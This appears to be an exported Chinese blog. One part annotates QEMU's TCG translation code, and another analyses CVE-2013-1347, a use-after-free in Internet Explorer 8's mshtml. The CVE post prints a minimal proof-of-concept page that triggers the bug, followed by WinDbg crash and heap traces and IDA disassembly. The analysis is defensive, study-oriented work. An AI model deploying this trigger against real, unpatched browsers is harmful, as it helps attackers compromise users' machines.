rcu_read_unlock(); /* fail safe : never use current_cpu outside cpu_exec() */ current_cpu = NULL; /* Does not need atomic_mb_set because a spurious wakeup is okay. */ atomic_set(&amp;tcg_current_cpu, NULL); return ret;&#125; cpu-exec.c tb_find_fast12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849static inline TranslationBlock *tb_find_fast(CPUState *cpu, TranslationBlock **last_tb, int tb_exit)&#123; CPUArchState *env = (CPUArchState *)cpu-&gt;env_ptr; TranslationBlock *tb; target_ulong cs_base, pc; uint32_t flags; /* we record a subset of the CPU state. It will always be the same before a given translated block is executed. */ //获得当前cpu相关信息 pc, cs_base, flags cpu_get_tb_cpu_state(env, &amp;pc, &amp;cs_base, &amp;flags); //tb加锁 tb_lock(); //尝试以TB的pc为参数寻找已经翻译过的TB tb = cpu-&gt;tb_jmp_cache[tb_jmp_cache_hash_func(pc)]; if (unlikely(!tb || tb-&gt;pc != pc || tb-&gt;cs_base != cs_base || tb-&gt;flags != flags)) &#123; /*没有找到则调用tb_find_slow 在tb_find_slow函数中会 以 pc(cs + eip)对应的物理地址寻找TB。如果找到则将TB写入tb_jmp_cache; 若否，則进行翻译。 */ tb = tb_find_slow(cpu, pc, cs_base, flags); &#125; if (cpu-&gt;tb_flushed) &#123; /* Ensure that no TB jump will be modified as the * translation buffer has been flushed. */ *last_tb = NULL; cpu-&gt;tb_flushed = false; &#125;#ifndef CONFIG_USER_ONLY /* We don't take care of direct jumps when address mapping changes in * system emulation. So it's not safe to make a direct jump to a TB * spanning two pages because the mapping for the second page can change. */ if (tb-&gt;page_addr[1] != -1) &#123; *last_tb = NULL; &#125;#endif /* See if we can patch the calling TB. */ if (*last_tb &amp;&amp; !qemu_loglevel_mask(CPU_LOG_TB_NOCHAIN)) &#123; //tb_add_jump(*last_tb, tb_exit, tb); &#125; tb_unlock(); return tb;&#125; cpu-exec.c tb_find_slow12345678910111213141516171819202122232425262728293031323334353637383940414243static TranslationBlock *tb_find_slow(CPUState *cpu, target_ulong pc, target_ulong cs_base, uint32_t flags)&#123; TranslationBlock *tb; tb = tb_find_physical(cpu, pc, cs_base, flags); if (tb) &#123; //如果在对应物理地址中找到TB则跳转到found goto found; &#125;#ifdef CONFIG_USER_ONLY /* mmap_lock is needed by tb_gen_code, and mmap_lock must be * taken outside tb_lock. Since we're momentarily dropping * tb_lock, there's a chance that our desired tb has been * translated. */ tb_unlock(); mmap_lock(); tb_lock(); tb = tb_find_physical(cpu, pc, cs_base, flags); if (tb) &#123; mmap_unlock(); goto found; &#125;#endif //没有找到则调用tb_gen_code进行翻译 /* if no translated code available, then translate it now */ tb = tb_gen_code(cpu, pc, cs_base, flags, 0);#ifdef CONFIG_USER_ONLY mmap_unlock();#endiffound: //将TB写入tb_jmp_cache /* we add the TB in the virtual pc hash table */ cpu-&gt;tb_jmp_cache[tb_jmp_cache_hash_func(pc)] = tb; return tb;&#125; translate-all.c tb_gen_code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/* Called with mmap_lock held for user mode emulation. */TranslationBlock *tb_gen_code(CPUState *cpu, target_ulong pc, target_ulong cs_base, uint32_t flags, int cflags)&#123; CPUArchState *env = cpu-&gt;env_ptr; TranslationBlock *tb; tb_page_addr_t phys_pc, phys_page2; target_ulong virt_page2; tcg_insn_unit *gen_code_buf; int gen_code_size, search_size;#ifdef CONFIG_PROFILER int64_t ti;#endif // 注意! 這裡會將虛擬位址轉成物理位址。phys_pc 將交給之後的 tb_link_page 使用。// get_page_addr_code 在 process mode 直接返回 pc; system mode 則透過查找// env 的 tlb_table 返回 GPA 在客戶機內存中的偏移量。 /* 将虚拟地址转化为物理地址，用户模式下直接返回pc,系统模式下看不下去 */ phys_pc = get_page_addr_code(env, pc); if (use_icount &amp;&amp; !(cflags &amp; CF_IGNORE_ICOUNT)) &#123; cflags |= CF_USE_ICOUNT; &#125; /* 分配TranslationBlock描述符，将要翻译的pc等信息记录下来 */ tb = tb_alloc(pc); if (unlikely(!tb)) &#123; buffer_overflow: /* flush must be done */ /* 分配失败，可能满了，清空cache */ tb_flush(cpu); /* cannot fail at this point */ tb = tb_alloc(pc); assert(tb != NULL); &#125; gen_code_buf = tcg_ctx.code_gen_ptr; tb-&gt;tc_ptr = gen_code_buf; tb-&gt;cs_base = cs_base; tb-&gt;flags = flags; tb-&gt;cflags = cflags; ....... //初始化gen_opc_ptr 和 gen_opparam_ptr tcg_func_start(&amp;tcg_ctx); tcg_ctx.cpu = ENV_GET_CPU(env); //生成TCG操作码 gen_intermediate_code(env, tb); tcg_ctx.cpu = NULL; trace_translate_block(tb, tb-&gt;pc, tb-&gt;tc_ptr); ...... /* ??? Overflow could be handled better here. In particular, we don't need to re-do gen_intermediate_code, nor should we re-do the tcg optimization currently hidden inside tcg_gen_code. All that should be required is to flush the TBs, allocate a new TB, re-initialize it per above, and re-do the actual code generation. */ //将TCG操作码翻译成相应host的指令 gen_code_size = tcg_gen_code(&amp;tcg_ctx, tb); if (unlikely(gen_code_size &lt; 0)) &#123; goto buffer_overflow; &#125; ...... return tb;&#125; target-i386/translate.c gen_intermediate_code这个函数看的好蒙啊，好多不懂的，简单来说就是调用了 disas_insn 函数把指令转化为 TCG 操作码 target-i386/translate.c disas_insn因为对操作码的处理情况太多，所以只分析了一部分1234567891011121314151617181920212223242526272829303132333435case 2: /* call Ev */ /* XXX: optimize if memory (no 'and' is necessary) */ if (dflag == MO_16) &#123; tcg_gen_ext16u_tl(cpu_T0, cpu_T0); &#125; //next_eip next_eip = s-&gt;pc - s-&gt;cs_base; tcg_gen_movi_tl(cpu_T1, next_eip); gen_push_v(s, cpu_T1); gen_op_jmp_v(cpu_T0); gen_bnd_jmp(s); gen_eob(s); break; case 0xe8: /* call im */ &#123; if (dflag != MO_16) &#123; tval = (int32_t)insn_get(env, s, MO_32); &#125; else &#123; tval = (int16_t)insn_get(env, s, MO_16); &#125; next_eip = s-&gt;pc - s-&gt;cs_base; tval += next_eip; if (dflag == MO_16) &#123; tval &amp;= 0xffff; &#125; else if (!CODE64(s)) &#123; tval &amp;= 0xffffffff; &#125; tcg_gen_movi_tl(cpu_T0, next_eip); gen_push_v(s, cpu_T0); gen_bnd_jmp(s); gen_jmp(s, tval); &#125; break; case 0xe8的情况下，加入是指令 8048902: call 80489d2,则它的机器指令为 E8 CB 00 00 00。 根据当前架构获得 tval = 0x000000cb, tcg_gen_movi_tl(cpu_T0, next_eip); 将下条指令保存到 cpu_T0, gen_push_T0(s) 将当前 CPU上 下文地址压入T0，保存调用前环境。gen_jmp(s, tval) 跳转到目标函数入口地址。]]></content>
      <tags>
        <tag>old_blog</tag>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2013-1347]]></title>
    <url>%2F2019%2F01%2F09%2FCVE-2013-1347%2F</url>
    <content type="text"><![CDATA[从备份失败的老博客还原出来的 poc 分析复现时使用的 poc 是漏洞战争附带资料里的 min_poc，代码如下12345678910111213141516171819202122232425262728293031&lt;!doctype html&gt; &lt;!-- required --&gt;&lt;HTML&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;ttttt:whatever id="myanim"/&gt;&lt;!-- required format --&gt;&lt;script&gt; f0=document.createElement('span'); document.body.appendChild(f0); f1=document.createElement('span'); document.body.appendChild(f1); f2=document.createElement('span'); document.body.appendChild(f2); document.body.contentEditable="true"; f2.appendChild(document.createElement('datalist')); //has to be a data list f1.appendChild(document.createElement('table')); //has to be a table try&#123; f0.offsetParent=null; //required &#125;catch(e)&#123; &#125; f2.innerHTML=""; //required f0.appendChild(document.createElement('hr')); //required f1.innerHTML=""; //required CollectGarbage(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 开启页堆和栈回溯1gflags.exe /i iexplore.exe +hpa +ust windbg 附加已经打开 poc 的 ie8 浏览器，发生崩溃12345678910110:013&gt; gModLoad: 6c770000 6c822000 C:\Windows\System32\jscript.dll(a44.664): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=68a89100 ebx=06e38fb0 ecx=06e1dfc8 edx=00000000 esi=0473c8e8 edi=00000000eip=6870b68d esp=0473c8bc ebp=0473c8d4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Windows\System32\mshtml.dll - mshtml!Ordinal104+0x4b0ee:6870b68d 8b01 mov eax,dword ptr [ecx] ds:0023:06e1dfc8=???????? 查看 ecx 发现不可访问，并且 ecx 指向的地址之前已经被 free, 所以可以存在 use after free 漏洞。回溯可知 mshtml!CGenericElement 对象被释放。1234567891011121314151617181920212223242526272829303132333435363738390:005&gt; dd ecx L106b04fc8 ????????0:005&gt; !heap -p -a ecx address 06b04fc8 found in _DPH_HEAP_ROOT @ 12a1000 in free-ed allocation ( DPH_HEAP_BLOCK: VirtAddr VirtSize) 6592750: 6b04000 2000 6cba90b2 verifier!AVrfDebugPageHeapFree+0x000000c2 772365f4 ntdll!RtlDebugFreeHeap+0x0000002f 771fa0aa ntdll!RtlpFreeHeap+0x0000005d 771c65a6 ntdll!RtlFreeHeap+0x00000142 7601bbe4 kernel32!HeapFree+0x00000014 6865c83a mshtml!CGenericElement::`scalar deleting destructor&apos;+0x0000003d 68711daf mshtml!CBase::SubRelease+0x00000022 6870a6b5 mshtml!CElement::PrivateRelease+0x0000002a 68707894 mshtml!PlainRelease+0x00000025 68753862 mshtml!PlainTrackerRelease+0x00000014 6bf3a735 jscript!VAR::Clear+0x0000005f 6bf56e46 jscript!GcContext::Reclaim+0x000000b6 6bf543e9 jscript!GcContext::CollectCore+0x00000123 6bfb83f0 jscript!JsCollectGarbage+0x0000001d 6bf4758c jscript!NameTbl::InvokeInternal+0x00000141 6bf44f84 jscript!VAR::InvokeByDispID+0x0000017f 6bf4e4c7 jscript!CScriptRuntime::Run+0x00002b80 6bf45d7d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce 6bf45cdb jscript!ScrFncObj::Call+0x0000008d 6bf45ef1 jscript!CSession::Execute+0x0000015f 6bf4620a jscript!COleScript::ExecutePendingScripts+0x000001bd 6bf4c3b9 jscript!COleScript::ParseScriptTextCore+0x000002a4 6bf4c1d1 jscript!COleScript::ParseScriptText+0x00000030 686ef774 mshtml!CScriptCollection::ParseScriptText+0x00000218 686ef58c mshtml!CScriptElement::CommitCode+0x000003c2 686ef34f mshtml!CScriptElement::Execute+0x000000c6 686d2d52 mshtml!CHtmParse::Execute+0x0000004a 686cc36a mshtml!CHtmPost::Broadcast+0x0000000f 686cceba mshtml!CHtmPost::Exec+0x000005f7 686ce945 mshtml!CHtmPost::Run+0x00000015 686ce8a9 mshtml!PostManExecute+0x000001fb 686ce80e mshtml!PostManResume+0x000000f7 下面来看下触发崩溃的指令的附近指令，很明显 ecx 是一个对象的地址，mov eax,dword ptr [ecx] 后 eax 为虚表地址，之后取偏移 0x70 调用虚函数。123456789100:005&gt; u 6870b68d mshtml!CElement::Doc:6870b68d 8b01 mov eax,dword ptr [ecx]6870b68f 8b5070 mov edx,dword ptr [eax+70h]6870b692 ffd2 call edx6870b694 8b400c mov eax,dword ptr [eax+0Ch]6870b697 c3 ret6870b698 90 nop6870b699 90 nop6870b69a 90 nop DOM树创建先看下 poc 中的第一条 js 语句1f0=document.createElement('span'); 可以通过 windbg 的 x 命令查询与 document.createElement 相关的函数。12340:005&gt; x mshtml!*document*createElement*68665e8d mshtml!CDocument::createElement = &lt;no type information&gt;68716ec0 mshtml!s_methdescCDocumentcreateElement = &lt;no type information&gt;68665ee6 mshtml!CDocument::CreateElementHelper = &lt;no type information&gt; 可以猜测 mshtml!CDocument::createElement 和 mshtml!CDocument::CreateElementHelper 函数和 document.createElement 有关，实际上也是由 mshtml!CDocument::createElement 去调用 mshtml!CDocument::CreateElementHelper 完成的。使用 windbg 对 CDocument::createElement 函数下断点，单步调试分析其功能，通过调试可以发现 CDocument::createElement 函数中实际创建元素的函数是 CDocument::CreateElementHelper 之后会调用所创建元素虚表偏移处 0xd8 和 0xe0 处的函数，如在上面的调试中调用的是创建 span 元素后的虚表中的 mshtml!CXDomainRequest::QueryInterface 和 mshtml!CDomPrototype::Release 函数，之后调用 CBase::SetErrorInfo 函数。注释见下图下面再来分析下 mshtml!CDocument::CreateElementHelper 函数。调试时遇到的一个问题是 ida 通过 mshtml 的 pdb 自动识别出来的变量和 windbg 的变量有区别，感觉 ida 错啦。对比如下 后面分析的时候我是按照 windbg 的类型来分析的。实际上在调试过程中主要的指令如下:其实就是先调用 CDocument::Markup(void) 获得 CMarkup 对象，然后通过 CMarkup::CreateElement() 创建新的元素。调试信息如下123456789101112131415161718192021222324252627282930313233343536373839400:005&gt; peax=00000004 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8eip=68665f28 esp=0456d034 ebp=0456d048 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CDocument::CreateElementHelper+0x45:68665f28 e813770a00 call mshtml!CDocument::Markup (6870d640)0:005&gt; eax=0589ef30 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8eip=68665f2d esp=0456d034 ebp=0456d048 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CDocument::CreateElementHelper+0x4a:68665f2d 50 push eax0:005&gt; ln poi(eax)(68701f30) mshtml!CMarkup::`vftable&apos; | (68702028) mshtml!CDoc::`vftable&apos;Exact matches: mshtml!CMarkup::`vftable&apos; = &lt;no type information&gt;0:005&gt; peax=0589ef30 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8eip=68665f2e esp=0456d030 ebp=0456d048 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CDocument::CreateElementHelper+0x4b:68665f2e 33c0 xor eax,eax0:005&gt; eax=00000000 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8eip=68665f30 esp=0456d030 ebp=0456d048 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CDocument::CreateElementHelper+0x4d:68665f30 e84bfeffff call mshtml!CMarkup::CreateElement (68665d80)0:005&gt; dd esp L10456d030 0589ef300:005&gt; ln poi(0589ef30) (68701f30) mshtml!CMarkup::`vftable&apos; | (68702028) mshtml!CDoc::`vftable&apos;Exact matches: mshtml!CMarkup::`vftable&apos; = &lt;no type information&gt;0:005&gt; peax=00000000 ebx=0456d58c ecx=0591bfd8 edx=68711db9 esi=0456d060 edi=05b80fc8eip=68665f35 esp=0456d040 ebp=0456d048 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CDocument::CreateElementHelper+0x52:68665f35 8bf0 mov esi,eax 继续动态调试 CMarkup::CreateElement 函数。发现实际上又调用了 CreateElement 函数去做处理。12345.text:682C5E1D push 1 ; struct CMarkup *.text:682C5E1F push 0 ; struct CDoc *.text:682C5E21 push ecx ; struct CElement **.text:682C5E22 push eax ; struct CHtmTag *.text:682C5E23 call CreateElement(CHtmTag *,CElement * *,CDoc *,CMarkup *,int *,ulong) 继续跟踪 CreateElement 函数。下面是部分调试信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661670:005&gt; eax=0472d56c ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd6fa esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x1d:686cd6fa 0fb64701 movzx eax,byte ptr [edi+1] ds:0023:060fcf01=740:005&gt; eax=00000074 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd6fe esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x21:686cd6fe c1e004 shl eax,40:005&gt; r eaxeax=000000740:005&gt; peax=00000740 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd701 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CreateElement+0x24:686cd701 0520397268 add eax,offset mshtml!g_atagdesc (68723920)0:005&gt; eax=68724060 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd706 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x29:686cd706 0f8405691100 je mshtml!CreateElement+0x2b (687e4011) [br=0]0:005&gt; eax=68724060 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd70c esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x38:686cd70c 8b4008 mov eax,dword ptr [eax+8] ds:0023:68724068=&#123;mshtml!CCommentElement::CreateElement (686977d2)&#125;0:005&gt; peax=686977d2 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd70f esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x3b:686cd70f 8d4d10 lea ecx,[ebp+10h]0:005&gt; eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd712 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x3e:686cd712 51 push ecx0:005&gt; peax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd713 esp=0472d524 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x3f:686cd713 52 push edx0:005&gt; eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd714 esp=0472d520 ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x40:686cd714 57 push edi0:005&gt; eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00eip=686cd715 esp=0472d51c ebp=0472d540 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CreateElement+0x41:686cd715 ffd0 call eax &#123;mshtml!CCommentElement::CreateElement (686977d2)&#125;...................................................0:005&gt; eax=00000000 ebx=04098fc0 ecx=00000065 edx=00000004 esi=00000000 edi=060fcf00eip=686cd729 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x4d:686cd729 8b4d10 mov ecx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc80:005&gt; eax=00000000 ebx=04098fc0 ecx=05ff2fc8 edx=00000004 esi=00000000 edi=060fcf00eip=686cd72c esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x50:686cd72c 8b11 mov edx,dword ptr [ecx] ds:0023:05ff2fc8=&#123;mshtml!CCommentElement::`vftable&apos; (68555798)&#125;0:005&gt; eax=00000000 ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00eip=686cd72e esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x52:686cd72e 8b4210 mov eax,dword ptr [edx+10h] ds:0023:685557a8=&#123;mshtml!CElement::Init (686c9f5d)&#125;0:005&gt; eax=686c9f5d ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00eip=686cd731 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x55:686cd731 ffd0 call eax &#123;mshtml!CElement::Init (686c9f5d)&#125;........................................0:005&gt; eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=68555798 esi=00000000 edi=060fcf00eip=686cd748 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x64:686cd748 8b5510 mov edx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc80:005&gt; eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd74b esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x67:686cd74b 51 push ecx0:005&gt; eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd74c esp=0472d524 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x68:686cd74c 57 push edi0:005&gt; eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd74d esp=0472d520 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x69:686cd74d 52 push edx0:005&gt; eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd74e esp=0472d51c ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x6a:686cd74e e85b000000 call mshtml!CElement::InitAttrBag (686cd7ae)......................................0:005&gt; eax=0839ef30 ebx=04098fc0 ecx=00000000 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd76e esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x82:686cd76e 8b4d10 mov ecx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc80:005&gt; eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd771 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x85:686cd771 8945f8 mov dword ptr [ebp-8],eax ss:0023:0472d538=000000000:005&gt; eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd774 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x88:686cd774 897df4 mov dword ptr [ebp-0Ch],edi ss:0023:0472d534=0472d5480:005&gt; eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00eip=686cd777 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x8b:686cd777 8b11 mov edx,dword ptr [ecx] ds:0023:05ff2fc8=&#123;mshtml!CCommentElement::`vftable&apos; (68555798)&#125;0:005&gt; eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00eip=686cd779 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x8d:686cd779 8b92f8000000 mov edx,dword ptr [edx+0F8h] ds:0023:68555890=&#123;mshtml!CElement::Init2 (686ca047)&#125;0:005&gt; eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00eip=686cd77f esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x93:686cd77f 8d45f4 lea eax,[ebp-0Ch]0:005&gt; eax=0472d534 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00eip=686cd782 esp=0472d528 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x96:686cd782 50 push eax0:005&gt; eax=0472d534 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00eip=686cd783 esp=0472d524 ebp=0472d540 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CreateElement+0x97:686cd783 ffd2 call edx &#123;mshtml!CElement::Init2 (686ca047)&#125; 主要功能及注释12345678910111213141516171819202122232425262728293031323334353637383940414243444546.text:686CD6FA movzx eax, byte ptr [edi+1] ; eax为索引.text:686CD6FE shl eax, 4.text:686CD701 add eax, offset CTagDesc const * const g_atagdesc ; 函数数组的地址.text:686CD706 jz loc_687E4011.text:686CD70C mov eax, [eax+8] ; 得到函数的实际地址.text:686CD70F lea ecx, [ebp+arg_8].text:686CD712 push ecx.text:686CD713 push edx.text:686CD714 push edi.text:686CD715 call eax ; 调用函数.text:686CD717 mov esi, eax.text:686CD719 test esi, esi.text:686CD71B jnz loc_68665D6C.text:686CD721 cmp [ebx], eax.text:686CD723 jnz loc_68665D67.text:686CD729 mov ecx, [ebp+arg_8] ; 得到上面call eax的结果即元素创建的返回值存到ecx.text:686CD72C mov edx, [ecx].text:686CD72E mov eax, [edx+10h] ; 取得相应元素虚表偏移0x10处的函数调用.text:686CD731 call eax.text:686CD733 mov esi, eax.text:686CD735 test esi, esi.text:686CD737 jnz loc_68665D6C.text:686CD73D cmp [ebx], eax.text:686CD73F jnz loc_68665D67.text:686CD745 mov ecx, [ebp+arg_4] ; this.text:686CD748 mov edx, [ebp+arg_8].text:686CD74B push ecx.text:686CD74C push edi ; struct CMarkup *.text:686CD74D push edx ; struct CHtmTag *.text:686CD74E call CElement::InitAttrBag(CHtmTag *,CMarkup *).text:686CD753 mov esi, eax.text:686CD755 test esi, esi.text:686CD757 jnz loc_68665D6C.text:686CD75D cmp [ebx], eax.text:686CD75F jnz loc_68665D67.text:686CD765 mov ecx, [ebp+arg_C].text:686CD768 mov eax, [ebp+arg_4].text:686CD76B mov [ebp+var_4], ecx.text:686CD76E mov ecx, [ebp+arg_8].text:686CD771 mov [ebp+var_8], eax.text:686CD774 mov [ebp+var_C], edi.text:686CD777 mov edx, [ecx].text:686CD779 mov edx, [edx+0F8h] ; 取得所创建元素虚表偏移0xf8处的虚函数并在下面调用.text:686CD77F lea eax, [ebp+var_C].text:686CD782 push eax.text:686CD783 call edx 下面继续分析创建 span 元素的函数。12345678910111213141516171819202122232425262728293031323334.text:68648F8C ; int __stdcall CSpanElement::CreateElement(struct CHtmTag *, struct CDoc *, struct CElement **).text:68648F8C public: static long __stdcall CSpanElement::CreateElement(class CHtmTag *, class CDoc *, class CElement * *) proc near.text:68648F8C ; DATA XREF: .text:68723ED8↓o.text:68648F8C.text:68648F8C arg_4 = dword ptr 0Ch.text:68648F8C arg_8 = dword ptr 10h.text:68648F8C.text:68648F8C mov edi, edi.text:68648F8E push ebp.text:68648F8F mov ebp, esp.text:68648F91 push esi.text:68648F92 push 28h ; dwBytes.text:68648F94 push 8 ; dwFlags.text:68648F96 push _g_hProcessHeap ; hHeap.text:68648F9C call ds:HeapAlloc(x,x,x).text:68648FA2 mov esi, eax ; 创建元素后保存在的内存地址.text:68648FA4 test esi, esi.text:68648FA6 jz short loc_68648FD2 ; 分配失败直接跳转到函数尾.text:68648FA8 push [ebp+arg_4] ; 传过来的CDoc对象.text:68648FAB push 5Bh.text:68648FAD call CElement::CElement(ELEMENT_TAG,CDoc *).text:68648FB2 mov dword ptr [esi], offset const CSpanElement::`vftable'.text:68648FB8 mov eax, esi ; eax = esi = span.text:68648FBA.text:68648FBA loc_68648FBA: ; CODE XREF: CSpanElement::CreateElement(CHtmTag *,CDoc *,CElement * *)+48↓j.text:68648FBA mov ecx, [ebp+arg_8].text:68648FBD mov [ecx], eax.text:68648FBF neg eax.text:68648FC1 sbb eax, 